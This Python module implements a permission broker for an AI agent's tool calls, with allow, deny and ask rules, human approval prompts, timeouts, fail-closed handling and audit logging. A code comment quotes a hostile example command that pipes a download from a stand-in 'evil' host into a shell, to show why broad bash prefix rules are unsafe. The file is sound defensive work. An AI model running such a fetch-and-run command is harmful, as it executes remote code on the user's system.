"""Process-wide tool-call permission broker (opencode-style approval gate).

Every ``HostDispatcher.__call__`` for a risk-bearing tool consults the singleton
``broker()`` via :meth:`PermissionBroker.gate`. The gate resolves the call
against the persisted rules (see :meth:`Store.resolve_permission`) and:

* ``allow`` → returns immediately;
* ``deny``  → returns a soft-fail the model can recover from;
* ``ask``   → persists a concrete approval request, emits an
  ``await_permission`` event when a UI channel exists, and BLOCKS the daemon
  turn until the user answers, the turn is cancelled, or the request expires.
  Headless/unattended execution fails closed by default; an operator must set
  ``OPENAI4S_UNATTENDED_APPROVAL=allow`` to opt into fail-open behaviour.

The broker is keyed by ``root_frame_id`` so the SAME dispatcher (foreground +
background cells) and any nested/delegated dispatcher all gate uniformly and
their prompts surface in the one conversation the user is watching — without the
delegation subsystem needing to know anything about the gate.
"""
from __future__ import annotations

import os
import re
import threading
import time
import uuid
from typing import Any, Callable

_SCOPES = ("once", "conversation", "project", "global")


def suggest_patterns(method: str, target: str) -> list[str]:
    """Offer a few generalizations of a tool target for the 'remember' picker,
    most-specific first (opencode's biggest UX win over storing exact strings)."""
    target = (target or "").strip()
    out: list[str] = []
    if target:
        out.append(target)
    if method == "bash" and target:
        # A '*' in a bash rule spans shell metacharacters, so a broad prefix rule
        # like 'git *' would also authorize 'git x && curl evil|sh'. Only offer
        # prefix generalizations for a SINGLE simple command (no ; && || | ` $()
        # redirects); for a compound command offer just the exact string.
        if not re.search(r"[;&|`]|\$\(|>|<", target):
            toks = target.split()
            if len(toks) >= 2:
                out.append(f"{toks[0]} {toks[1]} *")
            if toks:
                out.append(f"{toks[0]} *")
    elif method in ("write_file", "edit_file", "read_file", "save_artifact") and target:
        # dir/* and *.ext generalizations
        if "/" in target:
            out.append(target.rsplit("/", 1)[0] + "/*")
        if "." in target.rsplit("/", 1)[-1]:
            out.append("*." + target.rsplit(".", 1)[-1])
    elif method == "web_fetch" and target:
        out.append(target)  # already a domain
    elif method == "mcp_call" and "/" in target:
        out.append(target.split("/", 1)[0] + "/*")
    out.append("*")
    # de-dupe preserving order
    seen: set[str] = set()
    uniq: list[str] = []
    for p in out:
        if p and p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


class _Pending:
    __slots__ = (
        "event",
        "allow",
        "scope",
        "pattern",
        "message",
        "payload",
        "created_at",
        "store",
    )

    def __init__(self, payload: dict, store=None):
        self.event = threading.Event()
        self.allow = False
        self.scope = "once"
        self.pattern: str | None = None
        self.message: str | None = None
        self.payload = payload
        self.created_at = time.time()
        self.store = store


class PermissionBroker:
    DEFAULT_TIMEOUT = (
        900.0  # 15 min — backstop so a never-answered prompt frees the turn
    )
    _POLL = 0.5

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._channels: dict[str, dict] = {}  # root_frame_id -> {emit, cancel}
        self._pending: dict[str, _Pending] = {}  # decision_id -> _Pending
        self._by_root: dict[str, set[str]] = {}  # root_frame_id -> {decision_id}

    # --- UI channel registration (called by the web gateway) --------------
    def register_channel(
        self,
        root_frame_id: str,
        emit: Callable[[dict], Any],
        cancel_event: threading.Event | None = None,
        watching: Callable[[], bool] | None = None,
        store=None,
    ) -> None:
        # `watching` is UI metadata only. Approval correctness never depends on
        # a subscriber being present: unwatched requests remain durably pending.
        with self._lock:
            self._channels[root_frame_id] = {
                "emit": emit,
                "cancel": cancel_event,
                "watching": watching,
                "store": store,
            }

    def unregister_channel(self, root_frame_id: str) -> None:
        with self._lock:
            self._channels.pop(root_frame_id, None)

    def pending_events(self, root_frame_id: str) -> list[dict]:
        """Outstanding await_permission payloads for a conversation (for a
        client reconnecting mid-pause)."""
        with self._lock:
            memory = [
                self._pending[d].payload
                for d in self._by_root.get(root_frame_id, ())
                if d in self._pending
            ]
            channel = self._channels.get(root_frame_id) or {}
            store = channel.get("store")
        if store is None:
            return memory
        seen = {item.get("decision_id") for item in memory}
        try:
            durable = [
                row.get("payload") or {}
                for row in store.list_permission_requests(
                    root_frame_id=root_frame_id,
                    state="pending",
                )
                if row.get("decision_id") not in seen
            ]
        except Exception:  # noqa: BLE001 — reconnect must remain available
            durable = []
        return memory + durable

    def is_pending(self, root_frame_id: str) -> bool:
        """Whether a tool call is currently blocked awaiting approval for this
        conversation. The cell watchdog uses this to freeze its clock so a slow
        human approval is not mistaken for a wedged cell."""
        with self._lock:
            return bool(self._by_root.get(root_frame_id))

    # --- the gate (called by HostDispatcher, on the turn thread) ----------
    def gate(
        self,
        *,
        store,
        frame_id: str | None,
        method: str,
        target: str = "",
        view: tuple | None = None,
        project_id: str | None = None,
        timeout: float | None = None,
    ) -> dict:
        # Resolve the conversation identity + project from the dispatcher's frame
        # (works for root, background and delegated child dispatchers alike).
        root = frame_id
        proj = project_id
        try:
            if frame_id:
                fr = store.get_frame(frame_id)
                if fr:
                    root = fr.get("root_frame_id") or frame_id
                    proj = proj or fr.get("project_id") or "default"
                # A delegated sub-agent's child frame carries project_id='default';
                # resolve the project from the ROOT conversation frame so project-
                # scoped rules (and the ROOT's UI channel) apply to sub-agents too.
                if root and root != frame_id:
                    rfr = store.get_frame(root)
                    if rfr and rfr.get("project_id"):
                        proj = rfr.get("project_id")
        except Exception:  # noqa: BLE001 — never let resolution break a tool call
            pass
        try:
            decision = store.resolve_permission(
                root_frame_id=root,
                project_id=proj or "default",
                tool=method,
                pattern_input=target,
            )
        except Exception:  # noqa: BLE001
            decision = "ask"
        if decision == "allow":
            return {"allow": True}
        if decision == "deny":
            return {
                "allow": False,
                "message": "blocked by a standing 'deny' permission rule",
            }

        # decision == "ask": allocate the durable identity before deciding how
        # the caller will wait, so even a headless denial is auditable.
        did = "perm-" + uuid.uuid4().hex[:12]
        kind = view[0] if view else method
        title = view[1] if view else method
        inp = view[2] if (view and len(view) > 2) else {}
        payload = {
            "type": "await_permission",
            "frame_id": root,
            "decision_id": did,
            "tool": method,
            "kind": kind,
            "title": title,
            "input": inp,
            "target": target,
            "suggested_patterns": suggest_patterns(method, target),
            "scopes": list(_SCOPES),
            "sub_agent": bool(frame_id and root and frame_id != root),
        }
        wait_seconds = timeout if timeout is not None else self.DEFAULT_TIMEOUT
        try:
            store.create_permission_request(
                decision_id=did,
                root_frame_id=root,
                frame_id=frame_id,
                project_id=proj or "default",
                tool=method,
                target=target,
                payload=payload,
                expires_at=int((time.time() + wait_seconds) * 1000),
            )
        except Exception:  # noqa: BLE001 — inability to audit must fail closed
            return {
                "allow": False,
                "message": "approval required but its durable request could not be recorded",
            }

        with self._lock:
            chan = self._channels.get(root)
            if chan is not None and chan.get("store") is None:
                chan["store"] = store
        if chan is None:
            unattended = os.environ.get(
                "OPENAI4S_UNATTENDED_APPROVAL", "deny"
            ).strip().lower()
            allowed = unattended == "allow"
            state = "allowed" if allowed else "denied"
            message = (
                "allowed by explicit unattended approval policy"
                if allowed
                else "approval required but no interactive channel is attached"
            )
            try:
                store.resolve_permission_request(
                    did,
                    state=state,
                    scope="once",
                    message=message,
                )
            except Exception:  # noqa: BLE001
                allowed = False
                message = "approval persistence failed closed"
            return {"allow": allowed, **({} if allowed else {"message": message})}

        cancel_ev = chan.get("cancel")
        if cancel_ev is not None and cancel_ev.is_set():
            try:
                store.resolve_permission_request(
                    did, state="cancelled", scope="once", message="turn cancelled"
                )
            except Exception:  # noqa: BLE001
                pass
            return {"allow": False, "message": "turn cancelled"}

        pend = _Pending(payload, store=store)
        with self._lock:
            self._pending[did] = pend
            self._by_root.setdefault(root, set()).add(did)
        try:
            chan["emit"](payload)
        except Exception:  # noqa: BLE001
            pass

        deadline = time.time() + wait_seconds
        try:
            while not pend.event.wait(self._POLL):
                if cancel_ev is not None and cancel_ev.is_set():
                    pend.allow, pend.message = False, "turn cancelled"
                    break
                if time.time() >= deadline:
                    pend.allow, pend.message = False, "approval timed out"
                    break
        finally:
            with self._lock:
                self._pending.pop(did, None)
                s = self._by_root.get(root)
                if s:
                    s.discard(did)
                    if not s:
                        self._by_root.pop(root, None)
            try:
                chan["emit"](
                    {
                        "type": "permission_resolved",
                        "frame_id": root,
                        "decision_id": did,
                        "allow": pend.allow,
                        "scope": pend.scope,
                    }
                )
            except Exception:  # noqa: BLE001
                pass

        durable_state = (
            "allowed"
            if pend.allow
            else (
                "cancelled"
                if pend.message == "turn cancelled"
                else ("timed_out" if pend.message == "approval timed out" else "denied")
            )
        )
        try:
            store.resolve_permission_request(
                did,
                state=durable_state,
                scope=pend.scope,
                pattern=pend.pattern,
                message=pend.message,
            )
        except Exception:  # noqa: BLE001 — the action is already decided in memory
            if pend.allow:
                return {
                    "allow": False,
                    "message": "approval resolution could not be durably recorded",
                }
        # Persist a standing rule only after the concrete request's terminal
        # state is durable; otherwise a failed audit write could still leave a
        # broad allow rule behind.
        if pend.scope and pend.scope != "once":
            scope_id = {
                "conversation": root,
                "project": proj or "default",
                "global": "",
            }.get(pend.scope, "")
            try:
                store.set_permission_rule(
                    scope=pend.scope,
                    scope_id=scope_id,
                    tool=method,
                    pattern=(pend.pattern or target or "*"),
                    decision=("allow" if pend.allow else "deny"),
                )
            except Exception:  # noqa: BLE001
                pass
        if pend.allow:
            return {"allow": True}
        return {"allow": False, "message": pend.message or "denied by user"}

    # --- decision + cancel (called by the web gateway / HTTP thread) ------
    def resolve(
        self,
        decision_id: str | None,
        *,
        allow: bool,
        scope: str = "once",
        pattern: str | None = None,
        message: str | None = None,
    ) -> bool:
        if not decision_id:
            return False
        with self._lock:
            pend = self._pending.get(decision_id)
            if pend is not None:
                pend.allow = bool(allow)
                pend.scope = scope if scope in _SCOPES else "once"
                pend.pattern = pattern
                pend.message = message
                pend.event.set()
                return True
            # After a daemon restart there is no blocked thread, but the
            # durable request must still be resolvable and auditable. The
            # ledger/runtime layer can then resume or close the action group.
            stores = [
                channel.get("store")
                for channel in self._channels.values()
                if channel.get("store") is not None
            ]
        terminal = "allowed" if allow else "denied"
        for store in stores:
            try:
                request = store.get_permission_request(decision_id)
                if request is None or request.get("state") != "pending":
                    continue
                store.resolve_permission_request(
                    decision_id,
                    state=terminal,
                    scope=scope if scope in _SCOPES else "once",
                    pattern=pattern,
                    message=message,
                )
                return True
            except Exception:  # noqa: BLE001 — try another registered store
                continue
        return False

    def cancel_root(self, root_frame_id: str) -> None:
        """Deny every pending prompt for a conversation (on turn cancel)."""
        with self._lock:
            dids = list(self._by_root.get(root_frame_id, ()))
            for did in dids:
                pend = self._pending.get(did)
                if pend is not None:
                    pend.allow = False
                    pend.message = "turn cancelled"
                    pend.event.set()


_BROKER: PermissionBroker | None = None
_BROKER_LOCK = threading.Lock()


def broker() -> PermissionBroker:
    global _BROKER
    if _BROKER is None:
        with _BROKER_LOCK:
            if _BROKER is None:
                _BROKER = PermissionBroker()
    return _BROKER
